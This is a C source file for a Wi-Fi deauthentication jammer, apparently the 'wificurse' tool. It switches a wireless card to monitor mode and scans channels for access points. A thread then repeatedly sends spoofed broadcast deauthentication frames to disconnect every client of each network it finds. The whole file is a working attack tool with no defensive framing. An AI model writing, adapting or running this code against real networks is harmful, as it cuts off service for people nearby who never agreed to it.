#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <linux/wireless.h>
#include "iw.h"
#include "error.h"
#include "console.h"
#include "ap_list.h"
#include "channelset.h"
#include "wificurse.h"


#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))

struct _error {
	int errnum;
	int line;
	char *file;
	char msg[1024];
};

static struct _error __thread _error;


void set_error(char *file, int line, int errnum, char *fmt, ...) {
	va_list args;

	_error.file = file;
	_error.line = line;
	_error.errnum = errnum;
	va_start(args, fmt);
	vsnprintf(_error.msg, sizeof(_error.msg), fmt, args);
	va_end(args);
}

void print_error() {
	char buf[1024];
	strerror_r(_error.errnum, buf, sizeof(buf));
	fprintf(stderr, "%s:%d: %s: %s\n", _error.file, _error.line, _error.msg, buf);
}

void _err_msg(char *file, int line, int errnum, char *fmt, ...) {
	char buf[1024], msg[1024];
	va_list args;

	va_start(args, fmt);
	vsnprintf(msg, sizeof(msg), fmt, args);
	va_end(args);
	strerror_r(errnum, buf, sizeof(buf));
	fprintf(stderr, "%s:%d: %s: %s\n", file, line, msg, buf);
}

/////////////////////////////////////////////////////////////////////////////////////////////////

void iw_init_dev(struct iw_dev *dev) {
	memset(dev, 0, sizeof(*dev));
	dev->fd_in = -1;
	dev->fd_out = -1;
}

/* man 7 netdevice
 * man 7 packet
 */
int iw_open(struct iw_dev *dev) {
	struct ifreq ifr;
	struct iwreq iwr;
	struct sockaddr_ll sll;
	struct packet_mreq mreq;
	int fd;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		return_error("socket");
	dev->fd_in = fd;

	dev->fd_out = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (dev->fd_out < 0)
		return_error("socket");

	/* save current interface flags */
	memset(&dev->old_flags, 0, sizeof(dev->old_flags));
	strncpy(dev->old_flags.ifr_name, dev->ifname, sizeof(dev->old_flags.ifr_name)-1);
	if (ioctl(fd, SIOCGIFFLAGS, &dev->old_flags) < 0) {
		dev->old_flags.ifr_name[0] = '\0';
		return_error("ioctl(SIOCGIFFLAGS)");
	}

	/* save current interface mode */
	memset(&dev->old_mode, 0, sizeof(dev->old_mode));
	strncpy(dev->old_mode.ifr_name, dev->ifname, sizeof(dev->old_mode.ifr_name)-1);
	if (ioctl(fd, SIOCGIWMODE, &dev->old_mode) < 0) {
		dev->old_mode.ifr_name[0] = '\0';
		return_error("ioctl(SIOCGIWMODE)");
	}

	/* set interface down (ifr_flags = 0) */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* set monitor mode */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.mode = IW_MODE_MONITOR;
	if (ioctl(fd, SIOCSIWMODE, &iwr) < 0)
		return_error("ioctl(SIOCSIWMODE)");

	/* set interface up, broadcast and running */
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* get interface index */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		return_error("ioctl(SIOCGIFINDEX)");
	dev->ifindex = ifr.ifr_ifindex;

	/* bind interface to fd_in socket */
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = dev->ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	if (bind(dev->fd_in, (struct sockaddr*)&sll, sizeof(sll)) < 0)
		return_error("bind(%s)", dev->ifname);

	/* bind interface to fd_out socket */
	if (bind(dev->fd_out, (struct sockaddr*)&sll, sizeof(sll)) < 0)
		return_error("bind(%s)", dev->ifname);

	shutdown(dev->fd_in, SHUT_WR);
	shutdown(dev->fd_out, SHUT_RD);

	/* set fd_in in promiscuous mode */
	memset(&mreq, 0, sizeof(mreq));
	mreq.mr_ifindex = dev->ifindex;
	mreq.mr_type = PACKET_MR_PROMISC;
	if (setsockopt(dev->fd_in, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
		return_error("setsockopt(PACKET_MR_PROMISC)");

	return 0;
}

void iw_close(struct iw_dev *dev) {
	struct ifreq ifr;

	if (dev->fd_in == -1)
		return;

	if (dev->fd_out == -1) {
		close(dev->fd_in);
		return;
	}

	if (dev->old_flags.ifr_name[0] != '\0') {
		/* set interface down (ifr_flags = 0) */
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
		ioctl(dev->fd_in, SIOCSIFFLAGS, &ifr);
		/* restore old mode */
		if (dev->old_mode.ifr_name[0] != '\0')
			ioctl(dev->fd_in, SIOCSIWMODE, &dev->old_mode);
		/* restore old flags */
		ioctl(dev->fd_in, SIOCSIFFLAGS, &dev->old_flags);
	}

	close(dev->fd_in);
	close(dev->fd_out);
}

ssize_t iw_write(struct iw_dev *dev, void *buf, size_t count) {
	unsigned char *pbuf, *pkt;
	struct radiotap_hdr *rt_hdr;
	struct write_radiotap_data *w_rt_data;
	ssize_t r;

	pbuf = malloc(sizeof(*rt_hdr) + sizeof(*w_rt_data) + count);
	if (pbuf == NULL)
		return_error("malloc");

	rt_hdr = (struct radiotap_hdr*)pbuf;
	w_rt_data = (struct write_radiotap_data*)(pbuf + sizeof(*rt_hdr));
	pkt = pbuf + sizeof(*rt_hdr) + sizeof(*w_rt_data);

	/* radiotap header */
	memset(rt_hdr, 0, sizeof(*rt_hdr));
	rt_hdr->len = sizeof(*rt_hdr) + sizeof(*w_rt_data);
	rt_hdr->present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
	/* radiotap fields */
	memset(w_rt_data, 0, sizeof(*w_rt_data));
	w_rt_data->rate = 2; /* 1 Mb/s */
	w_rt_data->tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
	/* packet */
	memcpy(pkt, buf, count);

	r = send(dev->fd_out, pbuf, rt_hdr->len + count, 0);
	if (r < 0) {
		free(pbuf);
		return_error("send");
	} else if (r > 0) {
		r -= rt_hdr->len;
		if (r <= 0)
			r = 0;
	}

	free(pbuf);

	return r;
}

ssize_t iw_read(struct iw_dev *dev, void *buf, size_t count, uint8_t **pkt, size_t *pkt_sz) {
	struct radiotap_hdr *rt_hdr;
	int r;

	*pkt = NULL;
	*pkt_sz = 0;

	/* read packet */
	r = recv(dev->fd_in, buf, count, 0);
	if (r < 0)
		return_error("recv");
	else if (r == 0)
		return 0;

	rt_hdr = buf;
	if (sizeof(*rt_hdr) >= r || rt_hdr->len >= r)
		return ERRNODATA;

	*pkt = buf + rt_hdr->len;
	*pkt_sz = r - rt_hdr->len;

	return r;
}

int iw_set_channel(struct iw_dev *dev, int chan) {
	struct iwreq iwr;

	/* set channel */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.freq.flags = IW_FREQ_FIXED;
	iwr.u.freq.m = chan;
	if (ioctl(dev->fd_in, SIOCSIWFREQ, &iwr) < 0)
		return_error("ioctl(SIOCSIWFREQ)");
	dev->chan = chan;

	return 0;
}


/////////////////////////////////////////////////////////////////////////////////////////////////
/*ap list*/
/////////////////////////////////////////////////////////////////////////////////////////////////
void init_ap_list(struct ap_list *apl) {
	apl->head = NULL;
	apl->tail = NULL;
}

void free_ap_list(struct ap_list *apl) {
	struct access_point *tmp;

	while (apl->head != NULL) {
		tmp = apl->head;
		apl->head = apl->head->next;
		free(tmp);
	}

	apl->head = apl->tail = NULL;
}

void link_ap(struct ap_list *apl, struct access_point *ap) {
	if (apl->head == NULL)
		apl->head = apl->tail = ap;
	else {
		ap->prev = apl->tail;
		apl->tail->next = ap;
		apl->tail = ap;
	}
}

void unlink_ap(struct ap_list *apl, struct access_point *ap) {
	if (ap->prev)
		ap->prev->next = ap->next;
	else
		apl->head = ap->next;
	if (ap->next)
		ap->next->prev = ap->prev;
	else
		apl->tail = ap->prev;
}

int add_or_update_ap(struct ap_list *apl, struct ap_info *api) {
	struct access_point *ap;

	ap = apl->head;
	while (ap != NULL) {
		if (memcmp(ap->info.bssid, api->bssid, IFHWADDRLEN) == 0)
			break;
		ap = ap->next;
	}

	if (ap == NULL) {
		ap = malloc(sizeof(*ap));
		if (ap == NULL)
			return_error("malloc");

		memset(ap, 0, sizeof(*ap));
		memcpy(&ap->info, api, sizeof(ap->info));
		ap->last_beacon_tm = time(NULL);
		link_ap(apl, ap);
	} else
		ap->last_beacon_tm = time(NULL);

	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////
//console
//////////////////////////////////////////////////////////////////////////////////////////////
void clear_scr() {
	printf("\033[2J\033[1;1H");
	fflush(stdout);
}

void update_scr(struct ap_list *apl, struct iw_dev *dev) {
	struct access_point *ap;

	/* move cursor at colum 1 row 1 */
	printf("\033[1;1H");

	printf("\n CH %3d ][ Occluding IEEE 802.11" VERSION "\n\n", dev->chan);
	printf("       Deauth  "
	       "BSSID             "
	       "  CH  "
	       "ESSID\n\n");

	ap = apl->head;
	while (ap != NULL) {
		/* erase whole line */
		printf("\033[2K");
		if (ap->info.chan == dev->chan)
			printf(RED_COLOR "*" RESET_COLOR);
		else
			printf(" ");
		printf(" %11d", ap->num_of_deauths);
		printf("  %02x:%02x:%02x:%02x:%02x:%02x", ap->info.bssid[0],
		       ap->info.bssid[1], ap->info.bssid[2], ap->info.bssid[3],
		       ap->info.bssid[4], ap->info.bssid[5]);
		printf("  %3d ", ap->info.chan);
		if (ap->info.essid[0] == '\0') {
			printf(" <hidden>\n");
		} else
			printf(" %s\n", ap->info.essid);
		ap = ap->next;
	}

	/* clear screen from cursor to end of display */
	printf("\033[J");
	fflush(stdout);
}

///////////////////////////////////////////////////////////////////////////////////////////////

struct deauth_thread_args {
	struct ap_list *apl;
	struct iw_dev *dev;
	pthread_mutex_t *chan_mutex;
	pthread_cond_t *chan_cond;
	pthread_mutex_t *list_mutex;
	pthread_mutex_t *cnc_mutex;
	int chan_need_change;
	volatile int chan_changed;
	volatile int stop;
};

int send_deauth(struct iw_dev *dev, struct access_point *ap) {
	struct mgmt_frame *deauth;
	uint16_t *reason;
	ssize_t r;

	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
	if (deauth == NULL)
		return_error("malloc");

	memset(deauth, 0, sizeof(deauth));
	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
	memcpy(deauth->src_mac, ap->info.bssid, IFHWADDRLEN);
	memcpy(deauth->bssid, ap->info.bssid, IFHWADDRLEN);
	reason = (uint16_t*)&deauth->frame_body;
	/* reason 7: Class 3 frame received from nonassociated STA */
	*reason = 7;

	/* send deauth */
	deauth->sc.sequence = ap->sequence++;
	ap->sequence %= 4096;
	do {
		r = iw_write(dev, deauth, sizeof(*deauth) + sizeof(*reason));
	} while (r == 0);
	if (r < 0) {
		free(deauth);
		return r;
	}

	free(deauth);

	return 0;
}

int read_ap_info(struct iw_dev *dev, struct ap_info *api) {
	uint8_t buf[4096], *pkt;
	size_t pkt_sz;
	ssize_t r, tmp, n;
	uintptr_t tmp_ip;
	struct mgmt_frame *beacon;
	struct beacon_frame_body *beacon_fb;
	struct info_element *beacon_ie;

	r = iw_read(dev, buf, sizeof(buf), &pkt, &pkt_sz);
	if (r < 0)
		return r;

	if (pkt_sz < sizeof(*beacon) + sizeof(*beacon_fb))
		return ERRNODATA;

	beacon = (struct mgmt_frame*)pkt;

	/* if it's a beacon packet */
	if (beacon->fc.type == FRAME_CONTROL_TYPE_MGMT_FRAME
	    && beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
		memcpy(api->bssid, beacon->bssid, IFHWADDRLEN);
		beacon_fb = (struct beacon_frame_body*)beacon->frame_body;
		beacon_ie = (struct info_element*)beacon_fb->infos;
		api->essid[0] = '\0';
		n = 0;

		/* parse beacon */
		while (1) {
			tmp_ip = (uintptr_t)beacon_ie + sizeof(*beacon_ie);
			if (tmp_ip - (uintptr_t)buf >= r)
				break;
			tmp_ip += beacon_ie->len;
			if (tmp_ip - (uintptr_t)buf > r)
				break;
			if (beacon_ie->id == INFO_ELEMENT_ID_SSID) { /* SSID found */
				tmp = beacon_ie->len < ESSID_LEN ? beacon_ie->len : ESSID_LEN;
				memcpy(api->essid, beacon_ie->info, tmp);
				api->essid[tmp] = '\0';
				n |= 1;
			} else if (beacon_ie->id == INFO_ELEMENT_ID_DS) { /* channel number found */
				if (beacon_ie->len != 1)
					break;
				api->chan = beacon_ie->info[0];
				n |= 2;
			}
			if (n == (1|2))
				break;
			/* next beacon element */
			beacon_ie = (struct info_element*)&beacon_ie->info[beacon_ie->len];
		}

		/* if we didn't find the channel number
		 * then return ERRNODATA
		 */
		if (!(n & 2))
			return ERRNODATA;

		return 0;
	}

	return ERRNODATA;
}

void *deauth_thread_func(void *arg) {
	struct deauth_thread_args *ta = arg;
	struct access_point *ap, *tmp;
	int i, j, b;

	while (!ta->stop) {
		pthread_mutex_lock(ta->chan_mutex);
		/* make sure that it changed channel */
		while (!ta->chan_changed && !ta->stop)
			pthread_cond_wait(ta->chan_cond, ta->chan_mutex);

		b = 0;
		for (i=0; i<60 && !ta->stop; i++) {
			for (j=0; j<128 && !ta->stop; j++) {
				ap = ta->apl->head;
				while (ap != NULL && !ta->stop) {
					/* if the last beacon we got was 3 mins ago, remove AP */
					pthread_mutex_lock(ta->list_mutex);
					if (time(NULL) - ap->last_beacon_tm >= 3*60) {
						tmp = ap;
						ap = ap->next;
						unlink_ap(ta->apl, tmp);
						free(tmp);
						pthread_mutex_unlock(ta->list_mutex);
						continue;
					}
					pthread_mutex_unlock(ta->list_mutex);
					/* if interface and AP are in the same channel, send deauth */
					if (ap->info.chan == ta->dev->chan) {
						if (send_deauth(ta->dev, ap) < 0) {
							print_error();
							ta->stop = 2; /* notify main thread that we got an error */
						}
						b = 1;
						ap->num_of_deauths++;
					}
					ap = ap->next;
				}
				/* if we have send deauth, sleep for 2000 microseconds */
				if (b && !ta->stop)
					usleep(20000);
			}
			/* if we have send deauth, sleep for 180000 microseconds */
			if (b && !ta->stop)
				usleep(1800000);
		}

		pthread_mutex_lock(ta->cnc_mutex);
		if (ta->chan_need_change)
			ta->chan_changed = 0;
		pthread_mutex_unlock(ta->cnc_mutex);
		pthread_mutex_unlock(ta->chan_mutex);
	}

	return NULL;
}

static void print_usage(FILE *f) {
	fprintf(f, "\n  Occluding IEEE 802.11 " VERSION "\n\n");
	//fprintf(f, "  usage: wificurse [options] <interface>\n\n");
	fprintf(f, "  Options:\n");
	fprintf(f, "    -c channels      Channel list (e.g 1,4-6,11) (default: 1-14)\n");
	fprintf(f, "    -l               Display all network interfaces and exit\n");
	fprintf(f, "\n");
}

static int print_interfaces() {
	int sock, len;
	struct nlmsghdr *nlm;
	struct iovec iov;
	struct msghdr rtnl_msg;
	struct sockaddr_nl s_nl;
	struct {
		struct nlmsghdr nh;
		struct rtgenmsg rtgm;
	} req;
	char buf[8192];

	printf("Network interfaces:\n");

	/* open netlink socket */
	sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE);
	if (sock < 0) {
		perror("sock");
		return 1;
	}

	/* initialize request */
	memset(&req, 0, sizeof(req));
	req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(req.rtgm));
	req.nh.nlmsg_type = RTM_GETLINK;
	req.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	req.nh.nlmsg_seq = 1;
	req.nh.nlmsg_pid = getpid();
	req.rtgm.rtgen_family = AF_PACKET;

	memset(&s_nl, 0, sizeof(s_nl));
	s_nl.nl_family = AF_NETLINK;

	iov.iov_base = &req;
	iov.iov_len = req.nh.nlmsg_len;

	memset(&rtnl_msg, 0, sizeof(rtnl_msg));
	rtnl_msg.msg_iov = &iov;
	rtnl_msg.msg_iovlen = 1;
	rtnl_msg.msg_name = &s_nl;
	rtnl_msg.msg_namelen = sizeof(s_nl);

	/* send request */
	len = sendmsg(sock, &rtnl_msg, 0);
	if (len < 0) {
		perror("sendmsg");
		close(sock);
		return 1;
	}

	int end = 0;
	while (!end) {
		iov.iov_base = buf;
		iov.iov_len = sizeof(buf);

		memset(&rtnl_msg, 0, sizeof(rtnl_msg));
		rtnl_msg.msg_iov = &iov;
		rtnl_msg.msg_iovlen = 1;
		rtnl_msg.msg_name = &s_nl;
		rtnl_msg.msg_namelen = sizeof(s_nl);

		/* receive response */
		len = recvmsg(sock, &rtnl_msg, 0);
		if (len < 0) {
			perror("recvmsg");
			close(sock);
			return 1;
		}

		/* read response */
		nlm = (struct nlmsghdr*)buf;
		while (NLMSG_OK(nlm, len)) {
			if (nlm->nlmsg_type == NLMSG_DONE) {
				end = 1;
				break;
			} else if (nlm->nlmsg_type == RTM_NEWLINK) {
				struct ifinfomsg *ifinfo;
				struct rtattr *rta;
				int iflen;

				ifinfo = NLMSG_DATA(nlm);
				rta = IFLA_RTA(ifinfo);
				iflen = IFLA_PAYLOAD(nlm);

				while (RTA_OK(rta, iflen)) {
					if (rta->rta_type == IFLA_IFNAME)
						printf("  %s\n", (char*)RTA_DATA(rta));
					rta = RTA_NEXT(rta, iflen);
				}
			}
			nlm = NLMSG_NEXT(nlm, len);
		}
	}

	close(sock);
	return 0;
}

static int parse_chans_str(char *chans_str, channelset_t *chans) {
	char *s, *str, *ptrs[256] = { NULL };
	int i, j, n, chan1, chan2;

	channel_zero(chans);

	str = strtok_r(chans_str, ",", &s);
	ptrs[0] = str;
	n = 1;
	while (n < ARRAY_SIZE(ptrs)-1) {
		str = strtok_r(NULL, ",", &s);
		if (str == NULL)
			break;
		ptrs[n++] = str;
	}

	i = 0;
	while (ptrs[i] != NULL) {
		if (ptrs[i][0] == '-')
			return -1;
		n = 0;
		for (j = 0; ptrs[i][j] != '\0'; j++) {
			if (ptrs[i][j] == '-') {
				if (ptrs[i][j+1] == '\0')
					return -1;
				n++;
				if (n > 1)
					return -1;
			} else if (ptrs[i][j] < '0' || ptrs[i][j] > '9')
				return -1;
		}

		str = strtok_r(ptrs[i], "-", &s);
		chan1 = atoi(str);
		if (chan1 == 0)
			return -1;

		if (s[0] == '\0')
			chan2 = chan1;
		else
			chan2 = atoi(s);

		if (chan1 >= 256 || chan2 >= 256)
			return -1;

		if (chan1 > chan2)
			return -1;

		for (j = chan1; j <= chan2; j++)
			channel_set(chans, j);
		i++;
	}

	return 0;
}

int main(int argc, char *argv[]) {
	struct ap_list apl;
	struct ap_info api;
	struct iw_dev dev;
	struct pollfd pfd[2];
	struct deauth_thread_args ta;
	struct timeval tv1, tv2;
	suseconds_t msec;
	pthread_t deauth_thread;
	pthread_mutex_t chan_mutex, list_mutex, cnc_mutex;
	pthread_cond_t chan_cond;
	channelset_t chans;
	int ret, sigfd, c, n, chan;
	char *ifname, *chans_str;
	sigset_t exit_sig;
	time_t tm;

	if (argc < 2) {
		print_usage(stderr);
		return EXIT_FAILURE;
	}

	/* arguments */
	ifname = argv[argc-1];
	chans_str = NULL;

	while((c = getopt(argc, argv, "c:lh")) != -1) {
		switch (c) {
		case 'c':
			chans_str = optarg;
			break;
		case 'l':
			return print_interfaces();
		case 'h':
			print_usage(stdout);
			return EXIT_SUCCESS;
		case '?':
		default:
			return EXIT_FAILURE;
		}
	}

	if (argv[optind] != ifname) {
		print_usage(stderr);
		return EXIT_FAILURE;
	}

	if (getuid()) {
		fprintf(stderr, "Not root?\n");
		return EXIT_FAILURE;
	}

	/* init channel set */
	if (chans_str == NULL) {
		channel_zero(&chans);
		for (n=1; n<=14; n++)
			channel_set(&chans, n);
	} else {
		if (parse_chans_str(chans_str, &chans) == -1) {
			fprintf(stderr, "Can not parse the channels\n");
			return EXIT_FAILURE;
		}
	}

	/* init access point list */
	init_ap_list(&apl);

	/* init signals */
	sigemptyset(&exit_sig);
	sigaddset(&exit_sig, SIGINT);
	sigaddset(&exit_sig, SIGTERM);

	if (sigprocmask(SIG_BLOCK, &exit_sig, NULL) < 0) {
		err_msg("sigprocmask");
		return EXIT_FAILURE;
	}

	sigfd = signalfd(-1, &exit_sig, 0);
	if (sigfd < 0) {
		err_msg("signalfd");
		return EXIT_FAILURE;
	}

	pfd[0].fd = sigfd;
	pfd[0].revents = 0;
	pfd[0].events = POLLIN;

	/* init device */
	iw_init_dev(&dev);
	strncpy(dev.ifname, ifname, sizeof(dev.ifname)-1);

	if (iw_open(&dev) < 0) {
		print_error();
		goto _errout_no_thread;
	}

	pfd[1].fd = dev.fd_in;
	pfd[1].revents = 0;
	pfd[1].events = POLLIN;

	/* set channel */
	n = 0;
	chan = 0;
	do {
		chan = (chan % CHANNEL_MAX) + 1;
		if (channel_isset(&chans, chan))
			ret = iw_set_channel(&dev, chan);
		else
			ret = -1;
		/* if fails try next channel */
	} while(++n < CHANNEL_MAX && ret < 0);
	if (ret < 0) {
		print_error();
		goto _errout_no_thread;
	}

	/* start deauth thread */
	ta.stop = 0;
	ta.apl = &apl;
	ta.dev = &dev;
	pthread_mutex_init(&chan_mutex, NULL);
	ta.chan_mutex = &chan_mutex;
	pthread_cond_init(&chan_cond, NULL);
	ta.chan_cond = &chan_cond;
	pthread_mutex_init(&list_mutex, NULL);
	ta.list_mutex = &list_mutex;
	ta.chan_changed = 1;
	pthread_mutex_init(&cnc_mutex, NULL);
	ta.cnc_mutex = &cnc_mutex;
	ta.chan_need_change = 0;

	if (pthread_create(&deauth_thread, NULL, deauth_thread_func, &ta) < 0) {
		err_msg("pthread_create");
		goto _errout_no_thread;
	}

	clear_scr();
	update_scr(&apl, &dev);
	tm = time(NULL);
	gettimeofday(&tv1, NULL);

	while (!ta.stop) {
		if (poll(pfd, 2, 0) < 0) {
			err_msg("poll");
			goto _errout;
		}

		if (pfd[0].revents & POLLIN) /* got SIGTERM or SIGINT */
			break;

		if (pfd[1].revents & POLLIN) {
			ret = read_ap_info(&dev, &api);
			if (ret < 0 && ret != ERRNODATA) { /* error */
				print_error();
				goto _errout;
			} else if (ret == 0 && channel_isset(&chans, api.chan)) { /* got infos */
				pthread_mutex_lock(&list_mutex);
				if (add_or_update_ap(&apl, &api) < 0) {
					pthread_mutex_unlock(&list_mutex);
					print_error();
					goto _errout;
				}
				pthread_mutex_unlock(&list_mutex);
			}
		}

		gettimeofday(&tv2, NULL);
		if (tv2.tv_usec > tv1.tv_usec)
			msec = tv2.tv_usec - tv1.tv_usec;
		else
			msec = tv1.tv_usec - tv2.tv_usec;

		/* update screen every 0.5 second */
		if (msec >= 500000) {
			pthread_mutex_lock(&list_mutex);
			update_scr(&apl, &dev);
			pthread_mutex_unlock(&list_mutex);
			gettimeofday(&tv1, NULL);
		}

		/* change channel at least every 1 second */
		if (time(NULL) - tm >= 1) {
			if (!ta.chan_changed) {
				pthread_mutex_lock(&cnc_mutex);
				ta.chan_need_change = 0;
				pthread_mutex_unlock(&cnc_mutex);
				pthread_mutex_lock(&chan_mutex);
				n = 0;
				do {
					chan = (chan % CHANNEL_MAX) + 1;
					if (channel_isset(&chans, chan))
						ret = iw_set_channel(&dev, chan);
					else
						ret = -1;
					/* if fails try next channel */
				} while(++n < CHANNEL_MAX && ret < 0);
				/* if all channels failed */
				if (ret < 0) {
					print_error();
					goto _errout;
				}
				tm = time(NULL);
				ta.chan_changed = 1;
				pthread_cond_signal(&chan_cond);
				pthread_mutex_unlock(&chan_mutex);
			} else {
				pthread_mutex_lock(&cnc_mutex);
				ta.chan_need_change = 1;
				pthread_mutex_unlock(&cnc_mutex);
			}
		}
	}

	/* we got an error from deauth thread */
	if (ta.stop == 2)
		goto _errout;

	printf("\nExiting..\n");
	ta.stop = 1;
	pthread_mutex_unlock(&list_mutex);
	pthread_cond_broadcast(&chan_cond);
	pthread_mutex_unlock(&chan_mutex);
	pthread_join(deauth_thread, NULL);
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_SUCCESS;
_errout:
	ta.stop = 1;
	pthread_mutex_unlock(&list_mutex);
	pthread_cond_broadcast(&chan_cond);
	pthread_mutex_unlock(&chan_mutex);
	pthread_join(deauth_thread, NULL);
_errout_no_thread:
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_FAILURE;
}
